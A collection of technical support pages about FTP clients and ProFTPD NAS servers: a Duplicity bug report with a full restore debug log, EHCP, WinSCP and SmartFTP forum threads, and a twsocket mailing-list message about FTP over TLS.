Tecmint: Linux Howtos, Tutorials & Guides © 2019. All Rights Reserved.
The material in this site cannot be republished either online or offline, without our permission.
51 Useful Lesser Known Commands for Linux Users
25 Hardening Security Tips for Linux Servers
60 Commands of Linux : A Guide from Newbies to System Administrator
20 Command Line Tools to Monitor Linux Performance
18 Tar Command Examples in Linux
20 Linux YUM (Yellowdog Updater, Modified) Commands
25 Useful Basic Commands of APT-GET and APT-CACHE
20 Funny Commands of Linux or Linux is Fun in Terminal
Ebook: Introducing the RHCSA and RHCE Exam Preparation Guide
Preparation for the LFCS (Linux Foundation Certified SysAdmin) Exam
Preparation for the LFCE (Linux Foundation Certified Engineer) Exam
10 Useful Free Linux eBooks for Newbies and Administrators
4 Free Shell Scripting eBooks for Newbies and AdministratorsBug #1511308 “Cannot restore from no-encryption and no-compressi...” : Bugs : Duplicity
Log in / Register
Duplicity
Overview
Code
Bugs
Blueprints
Translations
Answers
Cannot restore from no-encryption and no-compression backup
Bug #1511308 reported by
Devrim Seral
on 2015-10-29
16
This bug affects 3 people
Affects
Status
Importance
Assigned to
Milestone
​
Duplicity
Edit
Fix Released
High
Unassigned
Edit
Duplicity 0.7.06
You need to log in to change this bug's status.
Affecting:
Duplicity
Filed here by:
Devrim Seral
When:
2015-10-29
Confirmed:
2015-10-30
Started work:
2015-10-30
Completed:
2015-12-07
Target
Distribution
Baltix
BOSS
Juju Charms Collection
Elbuntu
Guadalinex
Guadalinex Edu
Kiwi Linux
nUbuntu
PLD Linux
Tilix
tuXlab
Ubuntu
Ubuntu Linaro Evaluation Build
Ubuntu RTM
Package
(Find…)
Project
(Find…)
Status
Importance
Milestone
Fix Released
High
Duplicity 0.7.06
Assigned to
Nobody
Me
Comment on this change (optional)
Email me about changes to this bug report
Also affects project
(?)
Also affects distribution/package
Nominate for series
Bug Description
Duplicity version: 0.7.05 or 0.6.23
Python:
2.7.6
OS : Ubuntu 14.04.3 LTS
Type of filesystem : Linux ext4 and ftp
Log;
Using archive dir: /root/.cache/duplicity/674bf12b26a94fde71894638beff7845
Using backup name: 674bf12b26a94fde71894638beff7845
Import of duplicity.backends.azurebackend Succeeded
Import of duplicity.backends.botobackend Succeeded
Import of duplicity.backends.cfbackend Succeeded
Import of duplicity.backends.copycombackend Succeeded
Import of duplicity.backends.dpbxbackend Succeeded
Import of duplicity.backends.gdocsbackend Succeeded
Import of duplicity.backends.giobackend Succeeded
Import of duplicity.backends.hsibackend Succeeded
Import of duplicity.backends.hubicbackend Succeeded
Import of duplicity.backends.imapbackend Succeeded
Import of duplicity.backends.lftpbackend Succeeded
Import of duplicity.backends.localbackend Succeeded
Import of duplicity.backends.megabackend Succeeded
Import of duplicity.backends.multibackend Succeeded
Import of duplicity.backends.ncftpbackend Succeeded
Import of duplicity.backends.onedrivebackend Succeeded
Import of duplicity.backends.par2backend Succeeded
Import of duplicity.backends.pydrivebackend Succeeded
Import of duplicity.backends.rsyncbackend Succeeded
Import of duplicity.backends.ssh_paramiko_backend Succeeded
Import of duplicity.backends.ssh_pexpect_backend Succeeded
Import of duplicity.backends.swiftbackend Succeeded
Import of duplicity.backends.sxbackend Succeeded
Import of duplicity.backends.tahoebackend Succeeded
Import of duplicity.backends.webdavbackend Succeeded
LFTP version is 4.4.13
Using temporary directory /tmp/duplicity-U2b0wd-tempdir
Registering (mkstemp) temporary file /tmp/duplicity-U2b0wd-tempdir/mkstemp-qkmvhK-1
SETTINGS:
['set ssl:verify-certificate true\n', 'set ftp:ssl-allow false\n', 'set http:use-propfind true\n', 'set net:timeout 30\n', 'set net:max-retries 5\n', 'set ftp:passive-mode on\n', 'debug\n', "open -u 'bakuser,*****' ftp://10.0.0.199\n"]
Main action: restore
================================================================================
duplicity 0.7.05 ($reldate)
Args: /usr/bin/duplicity -v 9 --no-encryption --no-compression restore ftp://bakuser@10.0.0.199/backup_dir/db_backup/test restore/
Linux sisdb 3.19.0-31-generic #36~14.04.1-Ubuntu SMP Thu Oct 8 10:21:08 UTC 2015 x86_64 x86_64
/usr/bin/python 2.7.6 (default, Jun 22 2015, 17:58:13)
[GCC 4.8.2]
================================================================================
Registering (mkstemp) temporary file /tmp/duplicity-U2b0wd-tempdir/mkstemp-Z8sYPS-2
Temp has 44162039808 available, backup will use approx 34078720.
CMD: lftp -c 'source '/tmp/duplicity-U2b0wd-tempdir/mkstemp-qkmvhK-1'; cd 'backup_dir/db_backup/test/' || exit 0; ls'
Reading results of 'lftp -c 'source '/tmp/duplicity-U2b0wd-tempdir/mkstemp-qkmvhK-1'; cd 'backup_dir/db_backup/test/' || exit 0; ls''
STDERR:
---- Resolving host address...
---- 1 address found: 10.0.0.199
---- Connecting to 10.0.0.199 (10.0.0.199) port 21
<--- 220 NASFTPD Turbo station 1.3.5a Server (ProFTPD) [10.0.0.199]
---> FEAT
<--- 211-Features:
<---
MFF modify;UNIX.group;UNIX.mode;
<---
REST STREAM
<---
MLST modify*;perm*;size*;type*;unique*;UNIX.group*;UNIX.mode*;UNIX.owner*;
<---
UTF8
<---
LANG en-US*
<---
EPRT
<---
EPSV
<---
MDTM
<---
TVFS
<---
MFMT
<---
SIZE
<--- 211 End
---> LANG
<--- 200 Using default language en_US
---> OPTS UTF8 ON
<--- 200 UTF8 set to on
---> OPTS MLST modify;perm;size;type;UNIX.group;UNIX.mode;UNIX.owner;
<--- 200 OPTS MLST modify;perm;size;type;UNIX.group;UNIX.mode;UNIX.owner;
---> USER bakuser
<--- 331 Password required for bakuser
---> PASS *****
<--- 230 User bakuser logged in
---> PWD
<--- 257 "/" is the current directory
---- CWD path to be sent is `/backup_dir/db_backup/test'
---> CWD /backup_dir/db_backup/test
<--- 250 CWD command successful
---> PASV
<--- 227 Entering Passive Mode (10,0,0,199,219,30).
---- Connecting data socket to (10.0.0.199) port 56094
---- Data connection established
---> LIST
<--- 150 Opening ASCII mode data connection for file list
---- Got EOF on data connection
---- Closing data socket
<--- 226 Transfer complete
---> QUIT
---- Closing control socket
STDOUT:
-rw-rw----
1 bakuser
everyone
20480 Oct 29 11:38 duplicity-full-signatures.20151029T093849Z.sigtar
-rw-rw----
1 bakuser
everyone
202 Oct 29 11:38 duplicity-full.20151029T093849Z.manifest
-rw-rw----
1 bakuser
everyone
615508 Oct 29 11:38 duplicity-full.20151029T093849Z.vol1.difftar
Local and Remote metadata are synchronized, no sync needed.
CMD: lftp -c 'source '/tmp/duplicity-U2b0wd-tempdir/mkstemp-qkmvhK-1'; cd 'backup_dir/db_backup/test/' || exit 0; ls'
Reading results of 'lftp -c 'source '/tmp/duplicity-U2b0wd-tempdir/mkstemp-qkmvhK-1'; cd 'backup_dir/db_backup/test/' || exit 0; ls''
STDERR:
---- Resolving host address...
---- 1 address found: 10.0.0.199
---- Connecting to 10.0.0.199 (10.0.0.199) port 21
<--- 220 NASFTPD Turbo station 1.3.5a Server (ProFTPD) [10.0.0.199]
---> FEAT
<--- 211-Features:
<---
MFF modify;UNIX.group;UNIX.mode;
<---
REST STREAM
<---
MLST modify*;perm*;size*;type*;unique*;UNIX.group*;UNIX.mode*;UNIX.owner*;
<---
UTF8
<---
LANG en-US*
<---
EPRT
<---
EPSV
<---
MDTM
<---
TVFS
<---
MFMT
<---
SIZE
<--- 211 End
---> LANG
<--- 200 Using default language en_US
---> OPTS UTF8 ON
<--- 200 UTF8 set to on
---> OPTS MLST modify;perm;size;type;UNIX.group;UNIX.mode;UNIX.owner;
<--- 200 OPTS MLST modify;perm;size;type;UNIX.group;UNIX.mode;UNIX.owner;
---> USER bakuser
<--- 331 Password required for bakuser
---> PASS *****
<--- 230 User bakuser logged in
---> PWD
<--- 257 "/" is the current directory
---- CWD path to be sent is `/backup_dir/db_backup/test'
---> CWD /backup_dir/db_backup/test
<--- 250 CWD command successful
---> PASV
<--- 227 Entering Passive Mode (10,0,0,199,220,59).
---- Connecting data socket to (10.0.0.199) port 56379
---- Data connection established
---> LIST
<--- 150 Opening ASCII mode data connection for file list
---- Got EOF on data connection
---- Closing data socket
<--- 226 Transfer complete
---> QUIT
---- Closing control socket
STDOUT:
-rw-rw----
1 bakuser
everyone
20480 Oct 29 11:38 duplicity-full-signatures.20151029T093849Z.sigtar
-rw-rw----
1 bakuser
everyone
202 Oct 29 11:38 duplicity-full.20151029T093849Z.manifest
-rw-rw----
1 bakuser
everyone
615508 Oct 29 11:38 duplicity-full.20151029T093849Z.vol1.difftar
3 files exist on backend
4 files exist in cache
Extracting backup chains from list of files: [u'duplicity-full-signatures.20151029T093849Z.sigtar', u'duplicity-full.20151029T093849Z.manifest', u'duplicity-full.20151029T093849Z.vol1.difftar']
File duplicity-full-signatures.20151029T093849Z.sigtar is not part of a known set; creating new set
Ignoring file (rejected by backup set) 'duplicity-full-signatures.20151029T093849Z.sigtar'
File duplicity-full.20151029T093849Z.manifest is not part of a known set; creating new set
File duplicity-full.20151029T093849Z.vol1.difftar is part of known set
Found backup chain [Thu Oct 29 11:38:49 2015]-[Thu Oct 29 11:38:49 2015]
Last full backup date: Thu Oct 29 11:38:49 2015
Collection Status
-----------------
Connecting with backend: BackendWrapper
Archive dir: /root/.cache/duplicity/674bf12b26a94fde71894638beff7845
Found 0 secondary backup chains.
Found primary backup chain with matching signature chain:
-------------------------
Chain start time: Thu Oct 29 11:38:49 2015
Chain end time: Thu Oct 29 11:38:49 2015
Number of contained backup sets: 1
Total number of contained volumes: 1
Type of backup set:
Time:
Num volumes:
Full
Thu Oct 29 11:38:49 2015
1
-------------------------
No orphaned or incomplete backup sets found.
Registering (mktemp) temporary file /tmp/duplicity-U2b0wd-tempdir/mktemp-1QZDXI-3
CMD: lftp -c 'source '/tmp/duplicity-U2b0wd-tempdir/mkstemp-qkmvhK-1'; get 'backup_dir/db_backup/test/duplicity-full.20151029T093849Z.vol1.difftar' -o '/tmp/duplicity-U2b0wd-tempdir/mktemp-1QZDXI-3''
Reading results of 'lftp -c 'source '/tmp/duplicity-U2b0wd-tempdir/mkstemp-qkmvhK-1'; get 'backup_dir/db_backup/test/duplicity-full.20151029T093849Z.vol1.difftar' -o '/tmp/duplicity-U2b0wd-tempdir/mktemp-1QZDXI-3'''
STDERR:
---- Resolving host address...
---- 1 address found: 10.0.0.199
---- Connecting to 10.0.0.199 (10.0.0.199) port 21
<--- 220 NASFTPD Turbo station 1.3.5a Server (ProFTPD) [10.0.0.199]
---> FEAT
<--- 211-Features:
<---
MFF modify;UNIX.group;UNIX.mode;
<---
REST STREAM
<---
MLST modify*;perm*;size*;type*;unique*;UNIX.group*;UNIX.mode*;UNIX.owner*;
<---
UTF8
<---
LANG en-US*
<---
EPRT
<---
EPSV
<---
MDTM
<---
TVFS
<---
MFMT
<---
SIZE
<--- 211 End
---> LANG
<--- 200 Using default language en_US
---> OPTS UTF8 ON
<--- 200 UTF8 set to on
---> OPTS MLST modify;perm;size;type;UNIX.group;UNIX.mode;UNIX.owner;
<--- 200 OPTS MLST modify;perm;size;type;UNIX.group;UNIX.mode;UNIX.owner;
---> USER bakuser
<--- 331 Password required for bakuser
---> PASS *****
<--- 230 User bakuser logged in
---> PWD
<--- 257 "/" is the current directory
---> TYPE I
<--- 200 Type set to I
---> SIZE backup_dir/db_backup/test/duplicity-full.20151029T093849Z.vol1.difftar
<--- 213 615508
---> MDTM backup_dir/db_backup/test/duplicity-full.20151029T093849Z.vol1.difftar
<--- 213 20151029093850
---> PASV
<--- 227 Entering Passive Mode (10,0,0,199,219,156).
---- Connecting data socket to (10.0.0.199) port 56220
---- Data connection established
---> RETR backup_dir/db_backup/test/duplicity-full.20151029T093849Z.vol1.difftar
<--- 150 Opening BINARY mode data connection for backup_dir/db_backup/test/duplicity-full.20151029T093849Z.vol1.difftar (615508 bytes)
---- Got EOF on data connection
---- Closing data socket
<--- 226 Transfer complete
---> QUIT
---- Closing control socket
STDOUT:
Deleting /tmp/duplicity-U2b0wd-tempdir/mktemp-1QZDXI-3
Forgetting temporary file /tmp/duplicity-U2b0wd-tempdir/mktemp-1QZDXI-3
Processed volume 1 of 1
No files found in archive - nothing restored.
Releasing lockfile <lockfile.LinkFileLock instance at 0x7ff4a5ae4368>
Removing still remembered temporary file /tmp/duplicity-U2b0wd-tempdir/mkstemp-qkmvhK-1
Removing still remembered temporary file /tmp/duplicity-U2b0wd-tempdir/mkstemp-Z8sYPS-2
Solution : While i was rename duplicity-full.20151029T093849Z.vol1.difftar
as duplicity-full.20151029T093849Z.vol1.difftar.gz restore is working
(Credit: http://serverfault.com/questions/726525/cannot-restore-duplicity-backup )
Add tags
Tag help
Kenneth Loafman (kenneth-loafman)
on 2015-10-30
Changed in duplicity:
status:
New → In Progress
assignee:
nobody → Kenneth Loafman (kenneth-loafman)
importance:
Undecided → High
milestone:
none → 0.7.06
Kenneth Loafman (kenneth-loafman)
on 2015-11-02
summary:
- duplicity 0.7.05 cannot restore from ftp backup+ Cannot restore from no-encryption and no-compression backup
Kenneth Loafman (kenneth-loafman)
on 2015-11-05
Changed in duplicity:
assignee:
Kenneth Loafman (kenneth-loafman) → nobody
status:
In Progress → Fix Committed
Kenneth Loafman (kenneth-loafman)
on 2015-12-07
Changed in duplicity:
status:
Fix Committed → Fix Released
mirak (mirak-mirak)
wrote
on 2016-09-03:
#1
I encountered this bug, and someone here found a solution :
http://serverfault.com/questions/726525/cannot-restore-duplicity-backup
The bug is that duplicity wasn't compressing at all despite the --no-compression option, so the files are compressed despite not having the .gz extension.
Renaming .sigtar to sigtar.gz and all .difftar to .difftar.gz fixes the damn problem.
$ for i in *.difftar;do mv -v $i $i.gz;done
$ for i in *.sigtar;do mv -v $i $i.gz;done
mirak (mirak-mirak)
wrote
on 2016-09-03:
#2
I think duplicity should tell a message like "can't find .difftar.gz files", instead of saying "No files found in archive - nothing restored."
Also the bugfix should make duplicity check for a compressed .difftar anyway if it can't find a .difftar.gz
Alex N. (a-nox)
wrote
on 2016-12-06:
#3
Still unsolved for me, same issue here with duplicity 0.7.06-2ubuntu2.
See full activity log
To post a comment you must log in.
Report a bug
This report contains
Public
information
Edit
Everyone can see this information.
Mark as duplicate
Convert to a question
Link a related branch
Link to CVE
You are
not directly subscribed to this bug's notifications.
Subscribing...
Edit bug mail
Other bug subscribers
Subscribe someone else
•
Take the tour
•
Read the guide
© 2004-2019
Canonical Ltd.
•
Terms of use
•
Data privacy
•
Contact Launchpad Support
•
Blog
•
Careers
•
System status
•
r18991
(Get the code!)Recent Posts
Easy Hosting Control Panel (EHCP) :: Force Edition
Welcome, Guest. Please login or register.
1 Hour
1 Day
1 Week
1 Month
Forever
Login with username, password and session length
News:
EHCP Force Edition can be downloaded from GitHubhttps://github.com/earnolmartin/EHCP-Force-Edition
Home
Help
Search
Login
Register
Easy Hosting Control Panel (EHCP) :: Force Edition »
Recent Posts
Recent Posts
Pages: 1
... 3 4 [5] 6 7
... 10
41
General / Re: Update Log
« Last post by earnolmartin
on December 01, 2018, 06:34:59 pm »
Minor update released.
42
Technical Help / Re: Configure my own Nameserver
« Last post by earnolmartin
on November 19, 2018, 08:51:28 pm »
Ok, so add "ns1.spotiads.net" and "ns2.spotiads.net" as domains to your panel.  Configure the site for one of the domains, and then redirect the other to it (all configurable in the panel).
43
Technical Help / Re: Configure my own Nameserver
« Last post by minoir
on November 16, 2018, 06:07:16 pm »
My hosting I have it under IP 18.219.141.113, even if you enter sends you to the EHCP screenUse this post as a guide http://ehcp.net/?q=node/1042I want you to be able to write ns1.spotiads.net and ns2.spotiads.net when you set up a domain and show a site that you created using EHCP ForceNormally I have added an A record and I place the IP, but I have encountered situations where that does not work
44
Technical Help / Re: Configure my own Nameserver
« Last post by earnolmartin
on November 16, 2018, 05:40:12 pm »
Looks fine to me.  As long as 18.219.141.113 is your EHCP server, and you've added "spotiads.net" as a domain in the panel on 18.219.141.113, other domains should be able to use ns1.spotiads.net and ns2.spotiads.net as name servers.Is this the way you've set it up?  It's not working for you?  What exactly are you trying to do?
45
Technical Help / Configure my own Nameserver
« Last post by minoir
on November 13, 2018, 02:18:21 pm »
Try to make my own nameservers under the spotiads.net domainI use AWS as hosting, with ubuntu server. I attach captures as I have configured.Could I be missing some configuration?i'm testing with domain spotiads.tkhttps://drive.google.com/drive/folders/1y8DRbmDHLWLN2v0kR7i2Hdm7kb1-uaoy?usp=sharing
46
General / Re: Update Log
« Last post by earnolmartin
on September 22, 2018, 05:05:29 pm »
Minor update released.
47
Technical Help / Re: PHP in html file config please
« Last post by earnolmartin
on September 10, 2018, 04:23:59 pm »
Awesome, glad it worked.  Let me know if you run into any issues as a result of updating to the latest dev version.  These features will be released to the stable build soon.You can always change the order of which page should load by default when a specific page hasn't been requested (usually the index file).  That also appears in the subdomain or domain templates.  You can re-order which index page loads by default and has a higher priority than the others (index.html vs index.php).  Just search for index.html in the custom template, and you should see the lines I'm talking about.Thanks for testing it out.
48
Technical Help / Re: PHP in html file config please
« Last post by whiterabbitz
on September 10, 2018, 03:17:05 pm »
You are a star!Works .. with a small caveat.Being a long term cynic.. been in IT too long.1) Remove the pseudo  subdomain  devel.mydomain.com2) Ran update3) Added new subdomain devel.mydomain,com4) Tested devel.mydomain,com - Ok5) Modified index.php in devel.mydomain.com to make sure i was looking at the right file - all good6) Made the modes - template and /etc/php/7.0/fpm/pool.d/www.conf7) Re-tested devel.mydomain.com - file not found Re Re tested devel.mydomain,com/index.php - ok9) added index.html in devel.mydomain.com10) and tested devel.mydomain.com  - ok showed content of index.html11) Added <?php phpinfo(); ?>  to index.html - Worked like a charm!!So Only issue - which I can live with, is that the .html is the default extension and .php must be specified. Not a problem for this siteThanks again
49
Technical Help / Re: PHP in html file config please
« Last post by earnolmartin
on September 10, 2018, 12:58:53 pm »
Actually, could you please try updating your panel to the latest dev SVN version (instructions here http://ehcpforce.tk/download.php#svn-version) and use the new custom subdomain web server template functionality?After you've updated your panel, logout and login as admin, then select the domain you want to add a subdomain to (in your case "mydomain.com"), click on "Add Subdomain".  Add the "devel" subdomain.  Go back to the main domain management screen for "mydomain.com".  Click on "List Subdomains".  Click on the "Edit Template" icon for the "devel" subdomain.  Replace the ProxyPassMatch lines with the following:Code: [Select]ProxyPassMatch ^(.*\.(php|html))$ fcgi://127.0.0.1:9000{homedir}/$1Click on the "Save Template" button.Now, make sure you follow the instructions I posted above to get php-fpm to process .html files.  It should work this way now too, and we now have custom subdomain template functionality (assuming I coded the functionality correctly, which from my initial testing, I hopefully did).
50
Technical Help / Re: PHP in html file config please
« Last post by whiterabbitz
on September 10, 2018, 12:17:28 am »
Hi,Thanks so much for that.I will give it a try tomorrow and let you know the results.WR
Pages: 1
... 3 4 [5] 6 7
... 10
SMF 2.0.15 |
SMF © 2017, Simple Machines
XHTML
RSS
WAP2WinSCP 5.5.3 now requires default gateway? :: Support Forum :: WinSCP
Menu
Toggle search
WinSCP
Free
SFTP, SCP, S3 and FTP client
for Windows
Home
News
Introduction
Download
Install
Documentation
Forum
Close
Search
Close
Forum »
Support and Bug Reports »
WinSCP 5.5.3 now requires default gateway?
Reply to topic
Log in
Advertisement
Author
Message
Posted
duncansimpson
Guest
WinSCP 5.5.3 now requires default gateway?
2014-05-27 12:15
Hi there,
We have upgraded to WinSCP 5.5.3 and are now unable to connect to remote servers where the connecting client does not have a default gateway (but does have a static route to the destination server).
When connecting, it does request authentication - which works fine, but when that is finished it seems to "loose" connectivity with the remote server and gives an error message: "Transfer channel can't be opened. Reason: A socket operation was attempted to an unreachable host.
Could not retrieve directory listing."
Clicking Ok loads the main WinSCP folder screen but immediately "Timeout detected" is presented.
This seems to work fine with SFTP but with FTP or FTPS this does not appear to work correctly as above.
The server in question we are using is FTPS with Explicit TLS enabled.
To put things into context, we are a financial company and lock connectivity on our network down as much a possible, which is why we do not have default gateways on our PCs and only use static routes.
Reply with quote
Advertisement
martin◆
Site Admin
Joined:
2002-12-10
Posts:
31,103
Location:
Prague, Czechia
Re: WinSCP 5.5.3 now requires default gateway?
2014-05-29
What version did you use before? Can you attach a complete log file both using the old version and the latest one?_________________Martin Prikryl
Reply with quote
dsimpson
Joined:
2014-05-27
Posts:
5
Location:
UK
Re: WinSCP 5.5.3 now requires default gateway?
2014-06-02 14:33
We were using version 4.27.
So, that's pretty old!
Do you still want the logs from that version?
Or should we try slightly newer versions until I find where it stops working, and then give you the logs from that one?
Reply with quote
martin◆
Site Admin
Joined:
2002-12-10
Posts:
31,103
Location:
Prague, Czechia
Re: WinSCP 5.5.3 now requires default gateway?
2014-06-02
dsimpson wrote: Or should we try slightly newer versions until I find where it stops working, and then give you the logs from that one?
That would be great, obviously :)_________________Martin Prikryl
Reply with quote
dsimpson
Joined:
2014-05-27
Posts:
5
Location:
UK
2014-06-02 15:06
no worries, working my way through them...
Reply with quote
Advertisement
dsimpson
Joined:
2014-05-27
Posts:
5
Location:
UK
2014-06-02 16:50
OK, strangely enough I have been unable to reproduce the original working scenario of using an old version of WinSCP and be able to successfully connect to an FTPS server with only a static route and no default gateway.
But, just to hopefully get this moving I am posting my logs using the current version of WinSCP (slightly redacted to move private information).
Attached is the connection attempts in both Passive and non-Passive modes.
Both of them succesfully connect but then have issues as originally described afterwards.
WinSCP Connectivity Issue.zip (4.06 KB, Private file)
Reply with quote
martin◆
Site Admin
Joined:
2002-12-10
Posts:
31,103
Location:
Prague, Czechia
2014-06-10
Thanks for the log. Is the IP address attempted for passive mode transfer (109.231.208.149) what the FTP server hostname (obfuscated in the log) resolves to?
Reply with quote
dsimpson
Joined:
2014-05-27
Posts:
5
Location:
UK
2014-06-10 10:15
martin wrote: Thanks for the log. Is the IP address attempted for passive mode transfer (109.231.208.149) what the FTP server hostname (obfuscated in the log) resolves to?
Yes.
In both passive and non passive attempts the same things occurs.
Thanks for looking into this by the way (and I'd also like to say that we use this application for SFTP a lot, and it is fantastic!!)
Reply with quote
martin◆
Site Admin
Joined:
2002-12-10
Posts:
31,103
Location:
Prague, Czechia
2014-06-11
Not sure if you understand me.
What IP address do you get when you do ping ftp_server_hostname?
What is 10.152.1.166?
. 2014-06-02 16:37:42.614 Connected with ********************, negotiating TLS connection...
< 2014-06-02 16:37:42.658 220 NASFTPD Turbo station 1.3.2e Server (ProFTPD) [10.152.1.166]
_________________Martin Prikryl
Reply with quote
Advertisement
dsimpson
Joined:
2014-05-27
Posts:
5
Location:
UK
2014-06-11 16:20
Hi,
Sent you direct email reply on this :-)
martin wrote: Not sure if you understand me.
What IP address do you get when you do ping ftp_server_hostname?
What is 10.152.1.166?
. 2014-06-02 16:37:42.614 Connected with ********************, negotiating TLS connection...
< 2014-06-02 16:37:42.658 220 NASFTPD Turbo station 1.3.2e Server (ProFTPD) [10.152.1.166]
Reply with quote
martin◆
Site Admin
Joined:
2002-12-10
Posts:
31,103
Location:
Prague, Czechia
Re: WinSCP 5.5.3 now requires default gateway?
2015-04-08
More information about "Transfer channel can't be opened" error:
https://winscp.net/eng/docs/message_transfer_channel_cant_be_opened
Reply with quote
Advertisement
Reply to topic
Log in
You can post new topics in this forum
Advertisement
Contribute
Donate
$9
$19
$49
$99
User Approved Software
Total Downloads:
122,307,407
Rating:
4.8
out of
185
reviews
Sourceforge Review
Recommend
Tweet
English
简体中文
正體中文 (繁體)
Česky
Danish
Deutsch
English
Español (Castellano)
Eesti keel
Français
Hrvatski
Magyar
Italiano
日本語
한국어
Lietuvių
Nederlands
Polski
Română
По-русски
Slovensky
Srpski
Українська
Documentation
Quick Start
Guides
FTP Client
SFTP Client
SSH Client
Languages
Scripting
.NET and COM Library
Command Line Options
Portable Use
Support
Get Support
FAQ
Troubleshooting
Support Forum
History
Bug Tracker
Associations
SourceForge
TeamForge.net
DokuWiki
phpBB
Follow Us
Facebook
Twitter
LinkedIn
RSS News
© All rights reserved 2000–2019, WinSCP.net
WinSCP License
WinSCP Privacy PolicyRemote Browser Permissions - SmartFTP Forums
SmartFTP Home » SmartFTP Forums » Premium Support
Remote Browser Permissions
jfm
2010-05-21 09:22:58
Just installed the latest version as shown
+- System -----------------------------
Microsoft Windows XP Professional
Service Pack 3 (Build 2600)
CPU Speed
: 3391 MHz
Total Memory
: 2047 MB
Free Memory
: 2047 MB
+- SmartFTP ---------------------------
Version
: 4.0.1115.0
Time Stamp
: 2010-05-21 00:07:22
Platform
: x86
and the 'Unix Mode' permissions are displayed incorrectly. For example in the raw listing permissions are shown as -rw-rw-rw- which is correct, while in the remote browser they are shown as ---x-wxrw-.
Regards
John Martin
mb
2010-05-21 11:53:08
I cannot reproduce it here. Maybe you still had the old data in the cache?
Regards,
Mat
jfm
2010-05-21 13:00:15
Do a refresh, still looks the same. Is there somewhere I can download the previous version.
mb
2010-05-21 13:25:19
Can you send the log from the remote browser?
jfm
2010-05-21 13:32:21
Sure, how do I get to the log and where do you want me to send it
Is this what you want
[23:46:04] SmartFTP v4.0.1115.0
[23:46:04] Resolving host name "yoda"
[23:46:04] Connecting to 192.168.1.109 Port: 21
[23:46:04] Connected to yoda.
[23:46:04] 220 NASFTPD Turbo station 2.x 1.3.1rc2 Server (ProFTPD) [192.168.1.109]
[23:46:04] USER admin
[23:46:04] 331 Password required for admin
[23:46:04] PASS (hidden)
[23:46:05] 230 User admin logged in
[23:46:05] SYST
[23:46:05] 215 UNIX Type: L8
[23:46:05] Detected Server Type: UNIX
[23:46:05] RTT: 119.669 ms
[23:46:05] FEAT
[23:46:05] 211-Features:
[23:46:05]
LANG en
[23:46:05]
MDTM
[23:46:05]
UTF8
[23:46:05]
REST STREAM
[23:46:05]
SIZE
[23:46:05] 211 End
[23:46:05] OPTS UTF8 ON
[23:46:05] 200 UTF8 set to on
[23:46:05] Detected Server Software: ProFTPD
[23:46:05] PWD
[23:46:05] 257 "/" is the current directory
[23:46:05] CWD /Qphoto/Camera
[23:46:06] 250 CWD command successful
[23:46:06] PWD
[23:46:06] 257 "/Qphoto/Camera" is the current directory
[23:46:06] TYPE A
[23:46:06] 200 Type set to A
[23:46:06] PASV
[23:46:06] 227 Entering Passive Mode (192,168,1,109,220,88).
[23:46:06] Opening data connection to 192.168.1.109 Port: 56408
[23:46:06] LIST -aL
[23:46:06] 150 Opening ASCII mode data connection for file list
[23:46:06] 1458 bytes transferred. (10.1 KB/s) (140 ms)
[23:46:06] 226 Transfer complete
This is the raw listing which has correct permissions
drwxrwxrwx
14 admin
administrators 4096 Jan
1 19:42 .
drwxrwxrwx
5 admin
administrators 4096 Jun 18
2009 ..
drwxrwxrwx
4 admin
administrators 4096 Dec 30
2008 .@__thumb
-rw-rw-rw-
1 admin
administrators 23 Sep 30
2008 .hightlight
drwxrwxrwx
3 admin
administrators 8192 Dec 30
2008 20060822
drwxrwxrwx
3 admin
administrators 12288 Dec 30
2008 20061219
drwxrwxrwx
3 admin
administrators 4096 Dec 30
2008 20070425
drwxrwxrwx
3 admin
administrators 4096 Dec 30
2008 20071209
drwxrwxrwx
3 admin
administrators 4096 Dec 30
2008 20080428
drwxrwxrwx
3 admin
administrators 4096 Dec 30
2008 20080816
-rw-rw-rw-
1 admin
administrators 2015171 Aug 20
2008 2008_Auskick_Pres_1.JPG
-rw-rw-rw-
1 admin
administrators 2055376 Aug 20
2008 2008_Auskick_Pres_2.JPG
drwxrwxrwx
3 admin
administrators 4096 Jan 19 12:06 20090108
drwxrwxrwx
3 admin
administrators 4096 Jan 19 12:06 20090316
drwxrwxrwx
3 admin
administrators 4096 Jan 19 12:06 20090320
drwxrwxrwx
3 admin
administrators 4096 Jan 19 12:06 20091231
drwxrwxrwx
3 admin
administrators 4096 Jan 19 12:06 20100101
-rw-rw-rw-
1 admin
administrators 638285 Aug 20
2008 Boots.JPG
-rw-rw-rw-
1 admin
administrators 2622420 Aug 20
2008 JakeKingsVisit.JPG
-rw-rw-rw-
1 admin
administrators 355102 Aug 20
2008 Sydney.JPG
-rw-rw-rw-
1 admin
administrators 189952 Aug 20
2008 ehthumbs.db
All the directories in the raw listing are drwxrwxrwx on the remote browser they are all d--xrwxrwx
All seemed fine in version 1113
Let me know if you need anything else
john...
mb
2010-05-21 13:46:58
Try the following first:
1. Uninstall SmartFTP
2. Then install the latest version again
Maybe some files have not been updated correctly. You may need to reboot between 1 and 2.
mb
2010-05-21 14:57:38
Found the problem. The compiler used an old file. it will be fixed in the next build.
jfm
2010-05-21 22:04:49
Good that you found it.
Just tried the un-intall the re-install and came back to report that it didn't make a difference and I see that you have fixed it.
Thanks
john...
mb
2010-05-22 20:48:38
Please try it with the latest version:
https://www.smartftp.com/download
jfm
2010-05-23 00:36:17
Thanks, back to normal with 1116.
john...'[twsocket] A bug or bad configuration- wrong PbszAsync return code' - MARC
[prev in list] [next in list] [prev in thread] [next in thread]
List:
twsocket
Subject:
[twsocket] A bug or bad configuration- wrong PbszAsync return code
From:
"Robbert" <rma () vmsys ! com>
Date:
2011-01-13 5:43:38
Message-ID: F249A86D209241279B7E31725B5E1F85 () ROBBERTDEV
[Download RAW message or body]
Hi All,
I am testing sslFTPClient, when connecting to a FTP server with explicit ssl/TLS, I \
found RqType returned from PbszAsync is not right. Log listed below:
====== ftpDnsLookup ======
====== ftpWaitingBanner ======
====== ftpConnected ======
====== ftpReady ======
Request 1 Done.
StatusCode = 220
LastResponse was : "220 NASFTPD Turbo station 2.x 1.3.2e Server (ProFTPD) \
[192.168.10.32]" No error
====== ftpWaitingResponse ======
====== ftpReady ======
Request 48 Done.
StatusCode = 234
LastResponse was : "234 AUTH TLS successful"
No error
====== ftpWaitingResponse ======
====== ftpReady ======
Request 2 Done.
StatusCode = 331
LastResponse was : "331 Password required for nasftp"
No error
====== ftpWaitingResponse ======
====== ftpReady ======
Request 3 Done.
StatusCode = 230
LastResponse was : "230 User nasftp logged in"
No error
Call PBsz
====== ftpWaitingResponse ======
====== ftpReady ======
Request 52 Done.
----->This code doesn't look right, 53 is expected
StatusCode = 200
